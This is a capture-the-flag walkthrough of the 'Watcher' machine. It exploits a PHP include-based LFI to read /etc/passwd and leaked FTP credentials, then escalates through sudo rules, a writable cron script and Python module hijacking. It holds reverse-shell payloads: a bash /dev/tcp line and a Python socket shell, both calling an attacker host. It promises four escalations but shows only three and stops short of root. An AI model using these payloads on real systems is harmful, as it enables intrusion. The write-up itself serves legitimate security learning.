Watcher packs an unusual amount into one box. Getting a foothold is the easy part — a single LFI does all the work. What makes this one interesting is that root is four separate privilege escalations away, and every single one of them is a different trick. Nothing here needed to be clever twice.

## Getting In: LFI to RCE

A quick directory scan turns up `post.php`, `robots.txt`, and a couple of oddly-named files:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -b 400,404
feroxbuster -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x xml,html,php,txt,jpg,png,js,json --extract-links --scan-limit 2 --filter-status 401,403,404,405,500
```

`robots.txt` all but confirms one of them is worth reading:

```bash
curl -s http://<TARGET_IP>/robots.txt

User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

`post.php` takes a `post` parameter, and running it through PHP's filter wrapper dumps its own source instead of executing it:

```bash
curl -s "http://<TARGET_IP>/post.php?post=php://filter/convert.base64-encode/resource=post.php" | tr -d '\n' | base64 -d | grep php

<?php include $_GET["post"]; ?>
```

`include` is a completely normal PHP statement — it pulls in and runs another file's code inline, usually for templating or splitting an app into modules. The problem is entirely in *where* the filename comes from here: straight from user input, no validation, no restriction to a directory. Whatever `post.php` can read, I can read.

Including that file `robots.txt` said not to read:

```bash
curl -s "http://<TARGET_IP>/post.php?post=secret_file_do_not_read.txt"

Hi Mat,

The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files.

Will
----------
ftpuser:givemefiles777
```

And a quick read of `/etc/passwd` to see who's on the box:

```bash
curl -s "http://<TARGET_IP>/post.php?post=/etc/passwd" | grep bash | cut -d: -f1

root
will
mat
toby
ubuntu
```

Logging into FTP with the leaked credentials lands in the same `files` directory the note mentioned — which is also served over HTTP. That's upload plus LFI in one place, which is really just RCE waiting to happen: drop a PHP reverse shell over FTP, then request it through the LFI.

```bash

ftp> cd files
ftp> put php-reverse-shell.php
ftp> quit
```

## Four Ways Up

### sudo NOPASSWD

```bash
sudo -l

User www-data may run the following commands on <TARGET_IP>:
 (toby) NOPASSWD: ALL
```

That's about as direct as escalation gets:

```bash
sudo -u toby /bin/bash
id

uid=1003(toby) gid=1003(toby) groups=1003(toby)
```

### An Editable Cron Job

```bash
cat /etc/crontab

*/1 * * * * mat /home/toby/jobs/cow.sh
```

`mat` runs that script every minute, and `toby` can write to it. Swap the contents for a reverse shell, wait for the timer:

```bash
cat > /home/toby/jobs/cow.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1
EOF
chmod +x /home/toby/jobs/cow.sh
```

```bash
connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] 46206
id

uid=1002(mat) gid=1002(mat) groups=1002(mat)
```

### Python Library Hijacking

```bash
sudo -l

User mat may run the following commands on <TARGET_IP>:
 (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

`will_script.py` checks a command against a whitelist before running it — reasonable enough, except it imports its whitelist-checking function like this:

```python
from cmd import get_command
```

No path, just a module name. Python looks in the current directory before it looks anywhere else, and the script runs from `/home/mat/scripts/`. Whatever `cmd.py` sits there wins over the real standard library module.

```python
# cmd.py
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<ATTACKER_IP>",<ATTACKER_PORT>))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
def get_command(num):
 return ""
```

The `get_command` stub at the end matters more than it looks — `will_script.py` calls it right after the import, and without a matching function it would crash before the shell ever got a chance to connect.

```bash
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
id

uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
```

## Key Takeaways

**A file with a scary name isn't a security control.** `secret_file_do_not_read.txt` and a `robots.txt` entry aren't obstacles — they're just names. Read them.

**Escalation chains reward finishing the enumeration, not just the exploit.** Every single hop here — sudo, cron, Python imports, file permissions — was a fresh, independent check. Stopping after the first successful trick would have ended things at `toby`.

**An import without a path is a location, not just a name.** `from cmd import get_command` trusts wherever Python happens to look first, and the current working directory comes before the standard library.
